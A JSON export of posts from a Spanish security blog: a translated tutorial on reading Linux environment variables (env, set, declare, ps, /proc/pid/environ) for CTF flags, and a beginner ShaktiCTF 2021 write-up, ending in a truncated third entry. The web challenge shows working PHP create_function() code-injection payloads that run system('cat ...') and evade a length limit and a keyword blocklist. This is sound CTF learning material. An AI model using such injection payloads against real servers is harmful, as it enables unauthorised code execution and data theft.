[{"content":"Antes de empezar El presente art铆culo no es de mi autor铆a si no de Pantelis Roditis (proditis@echothrust.com), esto es solamente una traducci贸n realizada con el permiso del autor. El art铆culo original en ingl茅s lo puedes encontrar en el siguiente enlace: Environment variables and how to get them - Pantelis Roditis.\nMe pareci贸 buena idea traducirlo dado que gracias a su lectura me permiti贸 encontrar las banderas de entorno de la plataforma echoCTF.RED, adem谩s de aprender m谩s acerca del comportamiento de las variables de entorno.\nIntroducci贸n  Una variable de entorno es un valor nombrado que puede ser accedido y puede afectar el comportamiento de un proceso ejecutado en una computadora.\n wikipedia   Piensa en las variables como nombres simb贸licos que damos a los valores para evitar recordarlos. Imagina que usas el n煤mero 3.1415926535897932384626433 constantemente, a menos que seas una especie de robot, va a ser dif铆cil recordarlo. Entonces, le asignas un nombre al valor pi=3.1415926535897932384626433 y ahora cada vez que quieras usar el valor simplemente usas el nombre simb贸lico pi, en vez de la secuencia gigante de n煤meros.\nEn este documento, se describir谩 el uso de variables de entorno, c贸mo se puede acceder a ellas, manipularlas y aprovecharlas para ingenieros de seguridad tanto ofensivos como defensivos.\nPorque nos importa Entonces, 驴por qu茅 son importantes las variables de entorno desde la perspectiva de seguridad?\nSol铆a ser (en los viejos tiempos lol) que las variables de entorno eran visibles para todos y, como regla, la mayor铆a de los desarrolladores no las usaban para almacenar informaci贸n confidencial. Sin embargo, a medida que crec铆a la adopci贸n de variables de entorno, tambi茅n aumentaba la necesidad de comenzar a almacenar informaci贸n un poco m谩s confidencial. Por lo tanto, se agreg贸 la capacidad de ocultar las variables de entorno de otros usuarios y procesos a algunos, si no a todos, los sistemas UNIX y similares a UNIX (como Linux) y, por lo tanto, se limit贸 su superficie de ataque.\nAhora, nos hemos mudado a la era de los contenedores y las variables de entorno tienen un nuevo significado. Echa un vistazo r谩pido a Docker Hub y ver谩s millones de im谩genes que usan variables de entorno que contienen informaci贸n confidencial. Desde nombre de usuario, contrase帽as, claves de cifrado, tokens de autenticaci贸n, claves del sistema, hay una imagen con un uso de variable de entorno para adaptarse a cualquier imaginaci贸n\u0026hellip;\nComo ingeniero de seguridad ofensivo o defensivo, saber c贸mo encontrar lo que est谩 expuesto y poder acceder a esta informaci贸n es una habilidad casi necesaria.\nY no nos enga帽emos, esta es definitivamente una habilidad que apreciar谩s mientras juegas en nuestra plataforma en l铆nea echoCTF.RED, ya que las variables de entorno parecen m谩s dif铆ciles de obtener que el acceso del usuario root\u0026hellip;\nComo funcionan Usaremos una variedad de sistemas para examinar c贸mo se comportan las variables de entorno. Cuando no se menciona un sistema o shell, se puede asumir con seguridad que se trata de bash.\nComencemos definiendo y usando algunas variables:\n$ myint=1 $ mystring=\u0026#34;This is a long string\u0026#34; $ echo $myint 1 $ echo $mystring This is a long string Si desde la misma terminal vuelves a ejecutar bash notar谩s que las variables han desaparecido.\n$ echo $mystring This is a long string $ bash $ echo $mystring $ Lo mismo suceder谩 si abres otra terminal e intentas acceder a la variable. Entonces, 驴por qu茅 pasa eso?\nLas variables tienen efecto solo en la sesi贸n actual. Para que una variable est茅 disponible en los comandos y sesiones subsecuentes que se generan a partir de uno existente, tenemos que \u0026ldquo;exportarlos\u0026rdquo; (usando export en la terminal).\n$ export mystring $ bash $ echo $mystring This is a long string Muchos comandos y la mayor铆a de las shells usan archivos de configuraci贸n cuando se inician (por ejemplo, ~/.bashrc) para instruirles sobre la configuraci贸n de variables. Adem谩s, algunos comandos establecen sus propias variables para ayudar a los comandos subsecuentes (por ejemplo, USER establecido por el inicio de sesi贸n, etc.).\nVariables Docker Comprender el concepto de visibilidad de variables es especialmente importante en situaciones en las que las variables de entorno se configuran desde el inicio del sistema (como los contenedores docker), lo que, en determinadas condiciones, hace que se exporten al espacio de proceso global.\nNo profundizaremos en los detalles espec铆ficos de docker, s贸lo en la medida en que sea necesario para comprender las variables.\nVeamos un ejemplo con variables docker:\n$ docker run -it -e \u0026#34;myvar=myvalue\u0026#34; bash root@envlab: / # echo $myvar myvalue root@envlab: / #  Una cosa que notamos es que esta variable se exporta:\nroot@envlab: / # bash  root@envlab: / # echo $myvar myvalue Incluso si comenzamos un inicio de sesi贸n bash, la variable todav铆a est谩 all铆:\nroot@envlab: / # bash -l 4df007c4e761:/# echo $myvar myvalue 4df007c4e761:/# Incluso si cambiamos de usuario y shell, la variable se encuentra ah铆:\n4df007c4e761:/# su -s /bin/sh bin 4df007c4e761:/$ id uid=1(bin) gid=1(bin) groups=1(bin),1(bin),2(daemon),3(sys) 4df007c4e761:/$ echo $myvar myvalue Sin embargo, como podemos entender, esto podr铆a tener algunos efectos secundarios muy peligrosos, por esta raz贸n, muchos demonios que se ejecutan en el sistema eligen borrar el entorno para procesos posteriores (por ejemplo, php-fpm que tiene clear_env = yes por defecto). Esta es la raz贸n por la que no se puede acceder a ETSCTF_FLAG cuando se obtiene shell como www-data.\nComo obtenerlas Entonces, vayamos a la parte jugosa sobre c贸mo encontrar y mostrar los valores de estas variables.\nprintenv - imprime todo o parte del entorno El comando printenv se puede usar para ver las variables actuales definidas en el entorno.\nroot@envlab: / # printenv HOSTNAME=envlab PWD=/ HOME=/root _BASH_VERSION=5.1.8 _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 TERM=xterm SHLVL=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/bin/printenv root@envlab: / #  env - imprime el entorno o ejecuta un programa con un entorno modificado Los comandos env y printenv se comportan exactamente igual cuando se usan sin par谩metros. Sin embargo, env tambi茅n se puede usar para ejecutar un comando con un entorno modificado.\n Imprimir le ambiente actual.  root@envlab: / # env HOSTNAME=envlab PWD=/ HOME=/root _BASH_VERSION=5.1.8 _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 TERM=xterm SHLVL=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/usr/bin/env root@envlab: / # Reiniciar el entorno y ejecutar /usr/bin/env para imprimir el entorno y ver que est谩 vac铆o.  root@envlab: / # env -i /usr/bin/env  root@envlab: / #  Reiniciar el entorno y ejecutar /usr/local/bin/bash. Lo que obtenemos son las variables que bash define por defecto.  root@envlab: / # env -i /usr/local/bin/bash root@envlab: / # env PWD=/ SHLVL=1 _=/usr/bin/env root@envlab: / #  Ejecutar bash con la variable $HOME modificada.  root@envlab: / # env -i HOME=/home /usr/local/bin/bash root@envlab: / # echo $HOME /home root@envlab: / # env PWD=/ HOME=/home SHLVL=1 _=/usr/bin/env set BUILTIN - muestra o establece variables y funciones de shell Sin opciones, el nombre y el valor de cada variable se muestran en un formato que se puede reutilizar como entrada para configurar o restablecer las variables configuradas actualmente. Las variables de solo lectura no se pueden restablecer.\nWithout options, the name and value of each shell variable are displayed in a format that can be reused as input for setting or resetting the currently-set variables. Read-only variables cannot be reset.\nEste es un comando incorporado que se usa para definir y/o imprimir variables y funciones espec铆ficas de la shell.\nEjecutando solo set, devuelve muchas m谩s variables que antes.\nroot@envlab: / # set BASH=/usr/local/bin/bash BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath BASH_ALIASES=() BASH_ARGC=([0]=\u0026#34;0\u0026#34;) BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() BASH_VERSINFO=([0]=\u0026#34;5\u0026#34; [1]=\u0026#34;1\u0026#34; [2]=\u0026#34;8\u0026#34; [3]=\u0026#34;1\u0026#34; [4]=\u0026#34;release\u0026#34; [5]=\u0026#34;x86_64-pc-linux-musl\u0026#34;) BASH_VERSION=\u0026#39;5.1.8(1)-release\u0026#39; COLUMNS=211 DIRSTACK=() EUID=0 GROUPS=() HISTFILE=/root/.bash_history HISTFILESIZE=500 HISTSIZE=500 HOME=/root HOSTNAME=envlab HOSTTYPE=x86_64 IFS=$\u0026#39; \\t\\n\u0026#39; LINES=55 MACHTYPE=x86_64-pc-linux-musl MAILCHECK=60 OPTERR=1 OPTIND=1 OSTYPE=linux-musl PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PPID=0 PS1=\u0026#39;\\s-\\v\\$ \u0026#39; PS2=\u0026#39;\u0026gt; \u0026#39; PS4=\u0026#39;+ \u0026#39; PWD=/ SHELL=/bin/ash SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor SHLVL=1 TERM=xterm UID=0 _=bash _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 _BASH_VERSION=5.1.8 Estas son variables que est谩n definidas por nuestra instancia de la shell actual y, a menos que se modifiquen de otra manera, no ser谩n heredadas por los procesos secundarios. Por ejemplo, podemos ver que las variables relacionadas con BASH_ no est谩n configuradas en la invocaci贸n de la siguiente shell (ash en el siguiente ejemplo).\nroot@envlab: / # /bin/ash / # set HISTFILE=\u0026#39;/root/.ash_history\u0026#39; HOME=\u0026#39;/root\u0026#39; HOSTNAME=\u0026#39;envlab\u0026#39; IFS=\u0026#39; \u0026#39; LINENO=\u0026#39;\u0026#39; OPTIND=\u0026#39;1\u0026#39; PATH=\u0026#39;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#39; PPID=\u0026#39;1\u0026#39; PS1=\u0026#39;\\w \\$ \u0026#39; PS2=\u0026#39;\u0026gt; \u0026#39; PS4=\u0026#39;+ \u0026#39; PWD=\u0026#39;/\u0026#39; SHLVL=\u0026#39;2\u0026#39; TERM=\u0026#39;xterm\u0026#39; _=\u0026#39;/bin/sh\u0026#39; _BASH_BASELINE=\u0026#39;5.1\u0026#39; _BASH_LATEST_PATCH=\u0026#39;8\u0026#39; _BASH_VERSION=\u0026#39;5.1.8\u0026#39; / #  Una ventaja adicional de usar set es que tambi茅n muestra funciones que pueden haber sido definidas.\nroot@envlab: / # function mytest() { ls; } root@envlab: / # set|tail TERM=xterm UID=0 _=set _BASH_BASELINE=5.1 _BASH_LATEST_PATCH=8 _BASH_VERSION=5.1.8 mytest () { ls } root@envlab: / # mytest bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var declare / typeset BUILTINS - declarar variables y/o darles atributos Declarar variables y/o darles atributos. Si no se dan nombres, se muestran los valores de las variables. Este comando tiene la capacidad de mostrar y manipular variables, as铆 como sus atributos (por ejemplo, int, array, exported, etc.).\nSin argumentos, funciona como set, mostrando las variables y funciones de la shell y del entorno.\nenvlab:/# declare BASH=/usr/local/bin/bash BASH_ALIASES=() BASH_ARGC=([0]=\u0026#34;0\u0026#34;) BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() . . . Sin embargo, si ejecutamos declare -p tambi茅n podemos ver sus atributos.\nenvlab:/# declare -p declare -- BASH=\u0026#34;/usr/local/bin/bash\u0026#34; declare -i BASHPID declare -A BASH_ALIASES=() declare -a BASH_ARGC=([0]=\u0026#34;0\u0026#34;) declare -x PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; declare -ir UID=\u0026#34;0\u0026#34; Lo siguiente es lo que significan los atributos de declare:\n -a Cada nombre es una variable indexada en un arreglo. -A Cada nombre es una variable de un arreglo asociativo. -f Usar solo nombres de funciones. -i La variable se trata como un entero. -l Cuando se asigna un valor a la variable, todos los caracteres en may煤sculas se convierten en min煤sculas. -n Da a cada nombre el atributo nameref, convirti茅ndolo en una referencia de nombre a otra variable. -r Hacer nombres de solo lectura. -t Dar a cada nombre el atributo de seguimiento. -u Cuando se asigna un valor a la variable, todos los caracteres en min煤sculas se convierten en may煤sculas. -x Marcar nombres para exportar a comandos subsecuentes a trav茅s del entorno.  Para obtener m谩s detalles sobre el comando declare, consulte las p谩ginas del manual bash(1) en la secci贸n SHELL BUILTIN COMMANDS.\nEl comando typeset se comporta de manera muy similar a declare y est谩 all铆 principalmente para la compatibilidad con otros shells. Sin embargo, typeset sin opciones, devuelve todas las variables y funciones de la shell integradas.\nps Todos los comandos anteriores que vimos funcionan en la sesi贸n de la shell actual, sin embargo, muchas veces nos gustar铆a ver qu茅 variables de entorno se definieron para una aplicaci贸n que ya se est谩 ejecutando, que puede que nosotros hayamos iniciado o no.\nEl comando ps puede ayudar con eso. Este comando proporciona informaci贸n sobre los procesos en ejecuci贸n en un sistema, como PID, nombre, tiempo de ejecuci贸n, memoria utilizada, etc. Al agregar algunas opciones adicionales, podemos ver mucha m谩s informaci贸n que solo estas. Las opciones que son de nuestro inter茅s, junto con sus significados se pueden encontrar a continuaci贸n:\n a: Selecciona todos los procesos excepto los dos l铆deres de sesi贸n. e: Muestra el entorno despu茅s del comando. w: Amplia salida. Utilice esta opci贸n dos veces para un ancho ilimitado. f: Jerarqu铆a de procesos en arte ASCII (forest). u: Muestra formato orientado al usuario.  root@105b97a5ef81:/# ps -afeww UID PID PPID C STIME TTY TIME CMD root 1 0 0 08:48 pts/0 00:00:00 /bin/bash /entrypoint.sh bash root 17 1 0 08:48 pts/0 00:00:00 bash root 93 17 0 08:55 pts/0 00:00:00 ps -feww root@105b97a5ef81:/# ps -aufeww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 17964 2900 pts/0 Ss 08:48 0:00 /bin/bash /entrypoint.sh bash PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=envlab TERM=xterm DEBIAN_FRONTEND=noninteractive HOME=/root root 17 0.0 0.0 18180 3348 pts/0 S 08:48 0:00 bash HOSTNAME=envlab PWD=/ HOME=/root DEBIAN_FRONTEND=noninteractive TERM=xterm SHLVL=1 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/bin/bash root 94 0.0 0.0 36632 2908 pts/0 R+ 08:55 0:00 \\_ ps -ufeww HOSTNAME=envlab PWD=/ HOME=/root DEBIAN_FRONTEND=noninteractive TERM=xterm SHLVL=2 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin _=/bin/ps Podemos ver en el resultado anterior que obtenemos las variables de entorno tal como existen para cada uno de los comandos en ejecuci贸n. Sin embargo, hay algunas limitaciones. Si ejecutamos los mismos comandos que un usuario no root, podemos ver que no podemos ver el entorno de los procesos de otros usuarios.\ndatabus@63f7264d374e:/$ ps -aueww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 17964 2992 pts/0 Ss 09:04 0:00 /bin/bash /entrypoint.sh bash root 18 0.0 0.0 18184 3280 pts/0 S 09:04 0:00 bash root 67 0.0 0.0 46844 2772 pts/0 S 09:09 0:00 su - databus databus 68 0.0 0.0 4276 708 pts/0 S 09:09 0:00 -su TERM=xterm PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games MAIL=/var/mail/databus HOME=/ SHELL=/bin/sh USER=databus LOGNAME=databus databus 71 0.0 0.0 18188 3292 pts/0 S 09:09 0:00 bash -l MAIL=/var/mail/databus USER=databus HOME=/ LOGNAME=databus TERM=xterm PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games SHELL=/bin/sh PWD=/ sampleu+ 152 0.8 0.0 18196 3056 pts/1 Ss+ 09:13 0:00 bash databus 160 0.0 0.0 36632 2888 pts/0 R+ 09:14 0:00 ps -aueww USER=databus PWD=/ HOME=/ MAIL=/var/mail/databus SHELL=/bin/sh TERM=xterm SHLVL=1 LOGNAME=databus PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games _=/bin/ps Como podemos ver, los tres primeros procesos pertenecientes a root y sampleuser (una l铆nea antes de la 煤ltima) no tienen informaci贸n de entorno incluida en la salida de ps.\n/proc Hay otra forma de obtener el entorno de un proceso en ejecuci贸n y esto es a trav茅s de /proc, el pseudo-sistema de archivos de informaci贸n del proceso.\nEl sistema de archivos proc es un pseudo-sistema de archivos que proporciona una interfaz para las estructuras de datos del n煤cleo. Es com煤nmente montado en /proc, autom谩ticamente por el sistema.\nEl sistema de archivos proporciona una consulta f谩cil para consultar y manipular las estructuras del kernel como si fueran archivos simples. Para cada proceso en el sistema, hay un directorio correspondiente en /proc/\u0026lt;pid\u0026gt;/ con la informaci贸n del kernel exportado. Los archivos ubicados debajo de esa carpeta corresponden a diferentes tipos de informaci贸n del kernel, pero los que nos interesan son environ y cmdline.\n/proc/[pid]/environ: Este archivo contiene el entorno inicial que se estableci贸 cuando se inici贸 el programa que se est谩 ejecutando actualmente a trav茅s de execve(2). Las entradas est谩n separadas por bytes nulos (\\0), y puede haber un byte nulo en el fin. Por lo tanto, para imprimir el entorno del proceso 1, lo har铆a.\nroot@63f7264d374e:/# strings /proc/1/environ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=envlab TERM=xterm DEBIAN_FRONTEND=noninteractive HOME=/root /proc/[pid]/cmdline: Este archivo de solo lectura contiene la l铆nea de comando completa para el proceso, a menos que el proceso sea un zombi. En el 煤ltimo caso, no hay nada en este archivo: es decir, una lectura de este archivo devolver谩 0 caracteres. Los argumentos de la l铆nea de comandos aparecen en este archivo como un conjunto de cadenas separadas por bytes nulos (\\0), con un byte nulo adicional despu茅s de la 煤ltima cadena.\nroot@63f7264d374e:/# strings /proc/1/cmdline /bin/bash /entrypoint.sh bash La raz贸n por la que queremos examinar el environ es bastante clara, sin embargo, cmdline puede no serlo. La raz贸n por la que examinamos ambos archivos es que el comando que se inici贸 puede incluir variables de entorno en su l铆nea de comandos.\nTen en cuenta que, dependiendo de la opci贸n de montaje hidepid=n, el sistema de archivos /proc puede comportarse de manera diferente:\n 0: Todo el mundo puede acceder a todos los directorios /proc/[pid]. Este es el comportamiento tradicional y el predeterminado si no se especifica la opci贸n de montaje. 1: Los usuarios no pueden acceder a archivos y subdirectorios dentro de ning煤n directorio /proc/[pid] excepto el suyo propio (los directorios /proc/[pid] permanecen visibles). Los archivos confidenciales como /proc/[pid]/cmdline y /proc/[pid]/status ahora est谩n protegidos contra otros usuarios. Esto hace que sea imposible saber si alg煤n usuario est谩 ejecutando un programa espec铆fico (siempre y cuando el programa no se revele por su comportamiento). 2: Como en el modo 1, pero adem谩s los directorios /proc/[pid] que pertenecen a otros usuarios se vuelven invisibles. Esto significa que las entradas /proc/[pid] ya no se pueden usar para descubrir los PID en el sistema. Esto no oculta el hecho de que existe un proceso con un valor PID espec铆fico (se puede aprender por otros medios, por ejemplo, mediante kill -0 $PID), pero oculta el UID y el GID de un proceso, que de otro modo podr铆an aprenderse empleando stat(2) en un directorio /proc/[pid]. Esto complica enormemente la tarea de un atacante de recopilar informaci贸n sobre procesos en ejecuci贸n (por ejemplo, descubrir si alg煤n demonio se est谩 ejecutando con privilegios elevados, si otro usuario est谩 ejecutando alg煤n programa confidencial, si otros usuarios est谩n ejecutando alg煤n programa, etc.).  驴Qu茅 sigue? Espero que hayas disfrutado de la lectura y que hayas podido aprender algunos trucos adicionales para encontrar variables de entorno para tu sesi贸n, as铆 como para ejecutar procesos. Todo lo que tienes que hacer ahora es volver a echoCTF.RED y ver si puedes obtener las variables de entorno de esos objetivos que a煤n no has terminado .\nTen en cuenta que otros shells (ash, ksh, csh, etc.) pueden comportarse de manera diferente con respecto al entorno y las variables y funciones integradas. Los comandos descritos deben ser los mismos en la mayor铆a, sin embargo, la salida puede diferir. Siempre es una buena idea consultar las p谩ginas del manual del shell respectivo con el que se est谩 trabajando antes de probar cosas al azar.\nReferencias  https://docs.oracle.com/cd/E19683-01/817-6958/userconcept-26/index.html https://www.digitalocean.com/community/tutorials/how-to-read-and-set-environmental-and-shell-variables-on-linux https://www.cs.ait.ac.th/~on/O/oreilly/unix/upt/ch06_01.htm  ","permalink":"https://srrequiem.xyz/posts/env-vars/","summary":"Antes de empezar El presente art铆culo no es de mi autor铆a si no de Pantelis Roditis (proditis@echothrust.com), esto es solamente una traducci贸n realizada con el permiso del autor. El art铆culo original en ingl茅s lo puedes encontrar en el siguiente enlace: Environment variables and how to get them - Pantelis Roditis.\nMe pareci贸 buena idea traducirlo dado que gracias a su lectura me permiti贸 encontrar las banderas de entorno de la plataforma echoCTF.","title":"Variables de entorno y c贸mo obtenerlas"},{"content":"Intro El d铆a 3 abril del 2021 TeamShakti public贸 su anual competici贸n CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisi贸n de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca hab铆a participado en un CTF. Me pareci贸 una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el pr贸ximo CTF de Hackthebox.\nPresento un Write-up de los retos que pude resolver durante mi participaci贸n.\nForensics Follow up - 50 Descripci贸n We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.\nnetwork1.pcapng\nSoluci贸n Se descarg贸 un archivo tipo pcapng se identific贸 un stream TCP con wireshark y se sigui贸 dicho stream el cu谩l proporcion贸 un pastebin\nDentro del contenido del pastebin ven铆a la bandera\nBandera: shaktictf{Th15_w4s_eA5Y!!}\nDelete - 100 Descripci贸n Sometimes what you see is not always true\u0026hellip;\nchall.png\nSoluci贸n Se descarg贸 la imagen y despu茅s analizar el archivo con binwalk se vio que hab铆a aparentemente dos im谩genes en el mismo archivo, siguiendo la pista del t铆tulo del reto se separaron los bytes iniciales que correspond铆an a la primera imagen usando dd\n(kalikali)-[~/Desktop/shaktictf/forensics] $ binwalk chall.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 264 x 191, 8-bit colormap, non-interlaced 48 0x30 PNG image, 1200 x 1200, 8-bit/color RGBA, non-interlaced 89 0x59 Zlib compressed data, default compression (kalikali)-[~/Desktop/shaktictf/forensics] $ dd skip=48 if=chall.png of=chall1.png bs=1 46287+0 records in 46287+0 records out 46287 bytes (46 kB, 45 KiB) copied, 0.284482 s, 163 kB/s De esa manera chall1.png se vuelve una imagen que se puede visualizar con un visor de im谩genes sin ning煤n problema. Obteniendo as铆 la bandera.\nBandera: shaktictf{Y0u_4R3_aM4z1nG!!!!}\nWeb Magic - 100 Descripci贸n I found creating new functionalities as magic. So I went and created quite a few, now I don\u0026rsquo;t remember what is what. help me remember them :( !\ncheck out my application - http://35.238.173.184/\nSoluci贸n De acuerdo con el log que se dio en /admin.php se busc贸 alguna vulnerabilidad respecto a la menci贸n de una funci贸n deprecada create_function() y se observ贸 que era vulnerable a inyecci贸n de c贸digo.\nPermitiendo el listado de archivos en el directorio mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;ls -la\u0026quot;);/*\u0026quot;]\ntotal 84 drwxrwxrwx 1 www-data www-data 4096 Apr 3 11:43 . drwxr-xr-x 1 root root 4096 Mar 31 09:51 .. -rw-r--r-- 1 www-data www-data 0 Apr 3 11:02 12345642312 -rw-r--r-- 1 www-data www-data 65 Apr 2 23:39 1998_Dumb_secrets.php -rw-rw-r-- 1 www-data www-data 134 Apr 2 23:19 Dockerfile -rw-r--r-- 1 www-data www-data 39 Apr 3 11:40 a -rw-r--r-- 1 www-data www-data 0 Apr 3 11:39 aaa -rw-r--r-- 1 www-data www-data 1 Apr 3 11:40 aaaa -rw-r--r-- 1 www-data www-data 3251 Apr 2 22:45 admin.php lrwxrwxrwx 1 www-data www-data 8 Apr 3 11:43 asd -\u0026gt; flag.txt -rw-r--r-- 1 www-data www-data 1886 Apr 2 22:45 chat.html -rw-r--r-- 1 www-data www-data 1744 Apr 2 22:45 check.html drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 css -rw-r--r-- 1 www-data www-data 39 Apr 3 09:58 flag.html -rw-r--r-- 1 www-data www-data 39 Apr 3 11:35 flag.php -rw-r--r-- 1 www-data www-data 39 Apr 3 09:57 flag.txt drwxr-xr-x 1 www-data www-data 4096 Apr 2 22:47 fonts -rw-r--r-- 1 www-data www-data 1935 Apr 2 22:45 index.html -rw-r--r-- 1 www-data www-data 2114 Apr 2 22:45 login.html -rw-r--r-- 1 www-data www-data 1949 Apr 2 22:45 report.html -rw-r--r-- 1 www-data www-data 1976 Apr 2 22:45 rules.html -rw-r--r-- 1 www-data www-data 0 Apr 3 11:04 s.php -rw-r--r-- 1 www-data www-data 5 Apr 3 10:06 test.php Contenido de admin.php mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat admin.php\u0026quot;);/*\u0026quot;]\nVer c贸digo fuente del resultado\n\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, \u0026#39;on\u0026#39;); ini_set(\u0026#39;error_reporting\u0026#39;, E_ALL); $success = \u0026#39; \u0026lt;div class=\u0026#34;alert alert-success alert-dismissible\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;alert\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; Function declared. \u0026lt;/div\u0026gt; \u0026#39;; include \u0026#34;flag.php\u0026#34;; if (isset ($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; !empty ($_POST[\u0026#39;c\u0026#39;])) { $blacklist = \u0026#34;/mv|rm|exec/i\u0026#34;; $code = $_POST[\u0026#39;c\u0026#39;]; if(strlen($code)\u0026gt;60) { die(\u0026#34;too long to execute\u0026#34;); } if(preg_match($blacklist,$code)){ die(\u0026#34;that\u0026#39;s blocked\u0026#34;); } $fun = create_function(\u0026#39;$flag\u0026#39;, $code); print($success); } ?\u0026gt;Habiendo identificado un archivo que no es com煤n 1998_Dumb_secrets.php se intent贸 ver su contenido mediante:\nreturn -1 * var_dump($a[\u0026quot;\u0026quot;]);}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nObteniendo como resultado\ntoo long to execute\nObservando el c贸digo que procesa la petici贸n, vemos que verifica la longitud del formulario por lo que si acortamos el valor enviado, la funci贸n nos dejar谩 leer el archivo que queremos. Utilizando:\nreturn -1;}system(\u0026quot;cat 1998_Dumb_secrets.php\u0026quot;);/*\u0026quot;]\nVer c贸digo fuente del resultado\n\u0026lt;?php $flag1=\u0026quot;shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\u0026quot;; ?\u0026gt; Bandera: shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}\nCrypto Classically Easy - 50 Descripci贸n ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\nSoluci贸n Realizando un poco de an谩lisis a la cadena que se presenta en la descripci贸n del reto se puede ver claramente que presenta un formato de bandera con excepci贸n de los caract茅res especiales, por lo que despu茅s de descartar las opciones que pudieran servir para descifrarla (Cifrado C茅sar, ROT N). Se trat贸 de hacer otro alcance siguiendo el mismo principio de la rotaci贸n.\n   Char Recibido Valor de rotaci贸n Char Conocido     o +4 s   v +12 h   m +14 a   o +22 k   g +13 t   e +4 i   q +12 c   f +14 t   j +22 f    Lo que podr铆a significar un patr贸n n煤merico de rotaci贸n dada la repetici贸n de los espacios recorridos del char dado y el char de la bandera, siendo +4,+12,+14,+22,+13.\nEjercicio manual de sustituci贸n\nshaktictf{lets_start_with_14,22,13,4,12,14,22,13,4_12,14,22,13,4,12,14,22,13!}\nOptimizaci贸n del m茅todo por medio de un script simple.\n#!/usr/bin/python abc = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; values = [4,12,14,22,13] decrypt = \u0026#34;ovmogeqfj{yahe_wgwff_avpv_eszahtmac_qxefowoey!}\u0026#34; avoid = \u0026#34;{}_!\u0026#34; flag = \u0026#34;\u0026#34; valIndex = 0 for letter in decrypt: if letter in avoid: flag += letter continue if valIndex \u0026gt;= len(values): valIndex = 0 flag += abc[(abc.index(letter) + values[valIndex]) - len(abc)] valIndex += 1 print(flag) Resultado del script\nBandera: shaktictf{lets_start_with_something_classical!}\nMisc Sanity Check - 10 Al leer las reglas dentro del servidor de discord se encuentra la bandera\n13 . Grab your 10 points : shaktictf{G00d_t0_r34d_th3_rUl3s!}\nBandera: shaktictf{G00d_t0_r34d_th3_rUl3s!}\ndecodeit - 100 Descripci贸n just decode it!\nSoluci贸n Imagen descargada en c贸digo de barras\nSe utiliz贸 https://zxing.org/w/decode.jspx para decodear la imagen y obtener la bandera\nDecode Succeeded Raw text\tshaktictf{N1C3_w0rK_Fr13nD} Raw bytes\t68 53 48 41 4b 54 49 43 54 46 5b 2e 11 23 13 3f 57 10 52 2b 3f 26 52 11 13 4e 24 5d 65 6a Barcode format\tCODE_128 Parsed Result Type\tTEXT Parsed Result\tBandera: shaktictf{N1C3_w0rK_Fr13nD}\nltimas palabras Considerando que fue \u0026ldquo;one-man show\u0026rdquo; se obtuvo el lugar 156 de 452 en el ranking con un puntaje de 410 puntos.\nWrite-ups no oficiales de algunos retos\n","permalink":"https://srrequiem.xyz/posts/first-ctf/","summary":"Intro El d铆a 3 abril del 2021 TeamShakti public贸 su anual competici贸n CTF Beginner Friendly que lleva por nombre el mismo que el equipo ShaktiCTF. Tome la decisi贸n de participar y probar suerte siendo que \u0026ldquo;oficialmente\u0026rdquo; nunca hab铆a participado en un CTF. Me pareci贸 una buena oportunidad para practicar, aprender cosas nuevas y pulir mis habilidades, poniendo como objetivo (aunque lo considero apresurado) el alcanzar un rango aceptable en el pr贸ximo CTF de Hackthebox.","title":"Mi Primer CTF"},{"content":"Secronomic贸n URL: https://srrequiem.xyz/Secronomicon\nGITHUB: 